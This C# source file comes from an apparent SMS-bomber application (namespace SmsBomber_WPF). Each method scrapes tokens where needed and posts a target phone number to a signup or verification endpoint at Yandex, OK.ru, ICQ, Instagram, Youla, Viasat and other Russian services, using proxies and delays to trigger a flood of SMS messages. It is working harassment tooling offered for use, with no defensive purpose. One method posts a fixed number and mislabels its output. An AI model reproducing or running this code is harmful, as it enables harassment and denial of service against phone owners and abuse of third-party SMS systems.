using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using xNet;
using System.Text.RegularExpressions;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using SmsBomber_WPF.Views;

namespace SmsBomber_WPF.Services
{
    class SMS_Services
    {
        #region TEst
        public static Home home_Page = new Home();
        public static Settings Settings_Page = new Settings();
        static Random Rnd = new Random();
        #endregion

        public static string Yandex(string number)
        {
            try
            {
                var browser = new HttpRequest();
                Data.CheckProxy(browser);
                Thread.Sleep(Data.delay);
                string url = "https://passport.yandex.ru/registration/mail?from=mail&origin=home_v14_ru&retpath=https%3A%2F%2Fmail.yandex.ru%2F";
                string track = Regex.Match(browser.Get(url).ToString(), @"value=\""(\S{34})\""").Groups[1].Value;
                browser.AddHeader("X-Requested-With", "XMLHttpRequest");

                browser.AddHeader("Referer", "https://passport.yandex.ru/registration/mail?from=mail&origin=home_v14_ru&retpath=https%3A%2F%2Fmail.yandex.ru%2F");
                string response = Regex.Match(browser.Post("https://passport.yandex.ru/registration-validations/phone-confirm-code-submit/", "track_id=" + track + "&number=" + number + "&confirm_method=by_sms", "application/x-www-form-urlencoded").ToString(), @"\""status\"":\""(.*?)\""").Groups[1].Value;
                return response == "ok"? "Yandex: Ok" : "Yandex: Fail";
            }
            catch(Exception e) { return $"Yandex: {e.Message}"; }
        }

        public static string odnoklass(string number)
        {
            try
            {
                var browser = new HttpRequest();
                Data.CheckProxy(browser);
                Thread.Sleep(Data.delay);
                browser.AddHeader("X-Requested-With", "XMLHttpRequest");

                browser.Post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone/", "st.r.phone=+" + number, "application/x-www-form-urlencoded");
                return "OK.ru: OK\n";
            }
            catch { return "OK.ru: ERROR\n"; }
        }

        public static string ICQ(string number)
        {
            try
            {
                var browser = new HttpRequest();
                Data.CheckProxy(browser);
                Thread.Sleep(Data.delay);
                browser.AddHeader("X-Requested-With", "XMLHttpRequest");
                browser.AddHeader("Referer", "https://web.icq.com/");

                string response = Regex.Match(browser.Post("https://www.icq.com/smsreg/requestPhoneValidation.php", "msisdn=" + number + "&locale=ru&countryCode=ru&k=ic1rtwz1s1Hj1O0r&r=" + Rnd.Next(10000, 99999), "application/x-www-form-urlencoded").ToString(), @"\""statusText\"":\""(\w{2})\""").Groups[1].Value;
                return response == "OK" ? "ICQ: Ok" : "ICQ: Fail";
            }
            catch (Exception e) { return $"ICQ: {e.Message}"; }
        }

        public static string Instagram(string number)
        {
            try
            {
                var browser = new HttpRequest();
                Data.CheckProxy(browser);
                Thread.Sleep(Data.delay);

                string html = browser.Get("https://www.instagram.com").ToString();
                string token = Regex.Match(html, "{\"csrf_token\":\"(.*?)\"").Groups[1].Value;
                browser.AddHeader("X-CSRFToken", token);
                browser.AddHeader("X-Requested-With", "XMLHttpRequest");
                browser.AddHeader("Referer", "https://www.instagram.com/");

                string response = Regex.Match(browser.Post("https://www.instagram.com/accounts/send_signup_sms_code_ajax/", "client_id=W84r6AALAAHZ8R7K8swsthmsbNEB&phone_number=" + number, "application/x-www-form-urlencoded").ToString(), @"""sms_sent"":\s(.+),").Groups[1].Value;
                return response == "true" ? "Instagram: Ok" : "Instagram: Fail";
            }
            catch (Exception e) { return $"Instagram: {e.Message}"; }
        }

        public static string bxmaker(string number)
        {
            try
            {
                var browser = new HttpRequest();
                Data.CheckProxy(browser);
                Thread.Sleep(Data.delay);

                browser.AddHeader("X-Requested-With", "XMLHttpRequest");
                browser.AddHeader("Referer", "https://bxmaker.ru/auth/");

                string response = Regex.Match(browser.Post("https://bxmaker.ru/api/", "method=user.phone.sendCode&phone=" + number, "application/x-www-form-urlencoded").ToString(), "\"(response)\"").Groups[1].Value;
                return response == "response" ? "Bxmaker: Ok" : "Bxmaker: Fail";

            }
            catch (Exception e) { return $"Bxmaker: {e.Message}"; }
        }

        public static string strelkacard(string number)
        {
            try
            {
                var browser = new HttpRequest();
                Data.CheckProxy(browser);
                Thread.Sleep(Data.delay);
                
                browser.AddHeader("X-Requested-With", "XMLHttpRequest");
                browser.AddHeader("x-csrftoken", "IJf9AoS70EZu5eX8jJWIjstnKQKcry19");

                browser.Post("https://lk.strelkacard.ru/api/users/register/", "{\"phone\":\"" + number + "\"}", "application/json;charset=UTF-8");
                return "Strelka Card: Ok";
            }
            catch { return "Strelka Card: Fail"; }
        }

        public static string VipPlay(string number)
        {
            try
            {
                var browser = new HttpRequest();
                Data.CheckProxy(browser);
                Thread.Sleep(Data.delay);

                browser.Post("https://api-production.viasat.ru/api/v1/auth_codes", "{\"msisdn\":\"+" + number + "\"}", "application/json;charset=UTF-8");
                return "VipPlay: Ok";
            }
            catch { return "VipPlay: Fail"; }
        }

        public static string YouLa(string number)
        {
            try
            {
                var browser = new HttpRequest();
                Data.CheckProxy(browser);
                Thread.Sleep(Data.delay);
                string response = browser.Post("https://youla.ru/web-api/auth/request_code", "{\"phone\":\"+" + number + "\"}", "application/json;charset=UTF-8").ToString();
                return "YouLa: Ok";
            }
            catch{ return "YouLa: Fail"; }
        }
        public static string HoTik(string number)
        {
            try
            {
                var browser = new HttpRequest();
                Data.CheckProxy(browser);
                Thread.Sleep(Data.delay);

                string response = browser.Post("https://www.notik.ru/?ajax=true", "form=%D0%97%D0%B0%D0%BA%D0%B0%D0%B7%D0%B0%D1%82%D1%8C+%D0%B7%D0%B2%D0%BE%D0%BD%D0%BE%D0%BA&pagetitle=%D0%9D%D0%BE%D1%82%D0%B8%D0%BA%3A+%D0%97%D0%B0%D0%BA%D0%B0%D0%B7%D0%B0%D1%82%D1%8C+%D0%B7%D0%B2%D0%BE%D0%BD%D0%BE%D0%BA&pageurl=https%3A%2F%2Fwww.notik.ru%2Finformation%2F56&name=don't+call+me&email=asa%40a.w&phone=%2B7+(797)+857-45-78&content=77887", "application/x-www-form-urlencoded").ToString();
                return response == "response" ? "Bxmaker: Ok" : "Bxmaker: Fail";

            }
            catch (Exception e) { return $"Bxmaker: {e.Message}"; }
        }
    }
}
